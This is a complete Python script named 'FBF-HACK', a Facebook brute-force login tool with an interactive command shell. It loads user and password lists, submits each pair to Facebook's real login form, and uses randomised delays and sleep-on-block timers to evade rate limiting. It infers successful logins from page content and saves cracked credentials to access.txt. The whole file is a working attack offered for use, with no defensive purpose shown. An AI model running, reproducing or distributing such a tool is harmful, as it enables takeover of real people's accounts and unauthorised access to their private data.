#!/usr/bin/python3
#Created by : Mahmoud khalid
#FB profil : https://www.facebook.com/mahmoud.banzema.1
#Running on python3
#Use help command for display help menu
#For execute script use this command in terminal 'python3 FBF-HACK.py' not './FBF-HACK.py'

from sys import version
pyversion = version
if int(pyversion.split('.')[0]) != 3:
	print("[-] Failed, You have python verison {}, FBF-HACK running on python3 or more".format(pyversion[:3]))
	exit()
try:
	from platform import system
	from time import sleep,ctime
	from random import randrange
	import mechanicalsoup
except:
	print("[-] Failed mechanicalsoup not installed")
	OS = system()
	if OS == 'Windows':
			print("[+] Must install mechanicalsoup library for Windows OS")
			print(" -  Open CMD and use this command 'C:\Python{}\Script\pip.exe install mechanicalsoup'".format(pyversion[:3]))
			exit()
	elif OS == 'Linux':
			print("[+] Must install mechanicalsoup library for Linux OS")
			print(" -  Open terminal and use this command 'apt install python3-mechanicalsoup'")
			exit()
	else:
			print("[-] Try searching mechanicalsoup installation for your OS")
			exit()
			

userslist = ['USER','']
passwordtxt = ['PASSWORD','passwords.txt']
timernextup = ['TIMERNEXTUP',30]
blockedtimer = ['BLOCKEDTIMER',30]
typical = ['TYPICAL','DISABLE']

def banner():
	print("""
           _______  ____  __ _____  _______ __
          / __/ _ )/ __/ / // / _ |/ ___/ //_/
         / _// _  / _/  / _  / __ / /__/ ,<   
        /_/ /____/_/   /_//_/_/ |_\___/_/|_|  
									  
                --- [ FBF HACK ] ---
          --( Facebook Brute Force HACK )--
             Created By : Mahmoud Khalid
          FB Profile : FB/mahmoud.banzema.1
""")

def helpmenu():
	print("------------------------------------------------------")
	print("{:<25}{}".format('COMMANDS','DESCRIPTION'))
	print("------------------------------------------------------")
	print("{:<25}{}".format('SET',"Edit any option, for display it use 'OPTIONS' command"))
	print("{:<25}{}".format('OPTIONS',"Display use options"))
	print("{:<25}{}".format('RUN',"Running tool"))
	print("{:<25}{}".format('HELP',"Display helper menu"))
	print("{:<25}{}".format('EXIT',"Leave program"))
	
def options():
	print("---------------------------------------------------------------------------------")
	print("{:<25}{:<25}{:<10}{}".format('NAME','SETTING','REQUIRED','DESCRIPTION'))
	print("---------------------------------------------------------------------------------")
	print("{:<25}{:<25}{:<10}{}".format(userslist[0],userslist[1],'YES',"Set a users list file .txt or single user"))
	print("{:<25}{:<25}{:<10}{}".format(passwordtxt[0],passwordtxt[1],'YES',"Set a pass list file .txt or single password (Defualt : passwords.txt)"))
	print("{:<25}{:<25}{:<10}{}".format(timernextup[0],timernextup[1],'NO',"Number of seconds to new retry + 30 random sec (Default : 30 sec)"))
	print("{:<25}{:<25}{:<10}{}".format(blockedtimer[0],blockedtimer[1],'NO',"Number of minutes for sleeping in case of blocked (Default : 30 min)"))
	print("{:<25}{:<25}{:<10}{}".format(typical[0],typical[1],'NO',"Ignore password option and replace it with user account\n"))
	print("------------------------------------------------------")
	print("{:<9}: 'YES' Required can't be change to DISABLE".format('[!] NOTE '))
	print("{:<9}: 'NO' Required can be change to DISABLE EX: 'SET TIMERNEXTUP DISABLE'".format(' '))
	print("{:<9}:  Recommended don't disable any option so as not to be block account".format(' '))
	
def set(name,setting):
	if name.upper() == userslist[0]:
		if setting.lower() != 'disable':
			userslist[1] = setting
			print("SET {} ==> {}".format(userslist[0],userslist[1]))
	elif name.upper() == passwordtxt[0]:
		if setting.lower() != 'disable':
			passwordtxt[1] = setting
			print("SET {} ==> {}".format(passwordtxt[0],passwordtxt[1]))
	elif name.upper() == timernextup[0]:
		if setting.lower() == 'disable' or str(setting).isdigit() == True:
			timernextup[1] = setting
			print("SET {} ==> {}".format(timernextup[0],timernextup[1]))
	elif name.upper() == blockedtimer[0]:
		if setting.lower() == 'disable' or str(setting).isdigit() == True:
			blockedtimer[1] = setting
			print("SET {} ==> {}".format(blockedtimer[0],blockedtimer[1]))
	elif name.upper() == typical[0]:
		if setting.lower() in ['disable','enable']:
			typical[1] = setting.upper()
			print("SET {} ==> {}".format(typical[0],typical[1]))
	else:
		print("[-] This command is not found !")
		
def run(emails,passlist,timernextupfun,blockedtimerfun,typicalstatus):
	try:
		if passlist.endswith('.txt') == True and typical[1].lower() == 'disable':
			passfile = open(passlist,"r")
			passwordslist = passfile.readlines()
			lenghtpassowrdslist = len(passwordslist)
			print("[+] Successfully readed {} file".format(passlist))
		else:
			passwordslist = passlist.split()
			lenghtpassowrdslist = len(passwordslist)
	except:
		print("[-] Failed read {} file is not found".format(passlist))
		return;

	try:
		if emails.endswith('.txt') == True:
			emailfile = open(emails,'r')
			userslist = emailfile.readlines()
			lenghtuserslist = len(userslist)
			print("[+] Successfully readed {} file".format(emails))
		else:
			userslist = emails.split()
			lenghtuserslist = len(userslist)
	except:
		print("[-] Failed read {} file is not found".format(emails))
		return;

	try:
		browser = mechanicalsoup.Browser()
		try:
			login_page = browser.get("https://en-gb.facebook.com/login.php?login_attempt=1&lwv=100")
			login_form = login_page.soup.select("#login_form")[0]
			print("[+] Successfully facebook connection")
		except:
			print("[-] Failed facebook connection !")
			return;

		tryinguser = 1
		for email in userslist:
			if email in ['',' ','\n']:
					continue;
			email = email.rstrip("\n")
			print("\n[+] {}/{} Started FBF-HACK attack on {}".format(tryinguser,lenghtuserslist,email))
			tryingpass = 1
			for passwd in passwordslist:
				if typicalstatus.lower() == 'enable':
					passwd = email
				if passwd in ['',' ','\n']:
					continue;
				signupcounter = 0
				ErrorResponse = 0
				dispayonlyone = 0
				passwd = passwd.rstrip("\n")
				login_form.select("#email")[0]['value'] = email
				login_form.select("#pass")[0]['value'] = passwd
				page = browser.submit(login_form, login_page.url)
				print("[+] {}/{} - Trying password : {}".format(tryingpass,lenghtpassowrdslist,passwd))
				for onetext in page.soup.findAll("div"):
					gettext = onetext.text
					#print(gettext)										#Debuger
					if "Please try again later" in gettext:
						if dispayonlyone == 0:
							dispayonlyone = 1
							print("#{} Warnning {} {}#".format('-'*16,ctime(),'-'*16))
							print("# [!] Your bruteforce attack is Blocked !{}#".format(' '*27))
							if blockedtimerfun.isdigit() == True:
								print("# [+] sleeping {} minutes and then continue again...{}#".format(blockedtimerfun,' '*16))
								print("#"*69)
								sleep(int(blockedtimerfun)*60)
							else:
								print("#"*69)
					elif "Sign Up" in gettext:
						signupcounter += 1
					elif "We're working on getting this fixed as soon as we can" in gettext:
						ErrorResponse = 1
				dispayonlyone = 0	
				#print(signupcounter)									#Debuger	
				if signupcounter not in [11,9] and ErrorResponse == 0:
					print("[+] Success login account {}, password = {}".format(email,passwd))
					saving = open('access.txt','a')
					saving.write("[+] Success login account {}, password = {} at {}\n".format(email,passwd,ctime()))
					print("[+] Finished bruteforce attack at {} saving to access.txt".format(ctime()))
					break;
				else:
					print("[-] Failed login account")
				tryingpass += 1
				if typicalstatus.lower() == 'enable':
					break;
				if timernextupfun.isdigit() == True and tryingpass < lenghtpassowrdslist:
					randomtime = randrange(int(timernextupfun),int(timernextupfun)+30)
					print("[+] Next up trying after {} seconds".format(str(randomtime)))
					sleep(int(randomtime))
			tryinguser += 1
	except:
		pass;

#main script here
banner()
print("[+] Use help for help menu")
while True:
	try:
		shell = input("\nFBF-HACK@Shell~$:  ").split(' ')
	except:
		print("\n[!] See you later, Bye..")
		break;
	if shell[0].lower() in ['set','help','options','run','exit']:
		if shell[0].lower() == "set" and len(shell) == 3:
			set(shell[1],shell[2])
		elif shell[0].lower() == "help":
			helpmenu()
		elif shell[0].lower() == "options":
			options()
		elif shell[0].lower() == "exit":
			print("[!] See you later, Bye..")
			exit()
		elif shell[0].lower() == "run":
			spaceinput = ['',' ']
			if userslist[1] not in spaceinput and passwordtxt[1] not in spaceinput:
				run(str(userslist[1]),str(passwordtxt[1]),str(timernextup[1]),str(blockedtimer[1]),str(typical[1]))
			else:
				print("[-] USER / PASSWORD not found !")
		else:
			print("[-] This command is not found !")
	else:
		if shell[0] == '':
			continue;
		else:
			print("[-] This command is not found !")
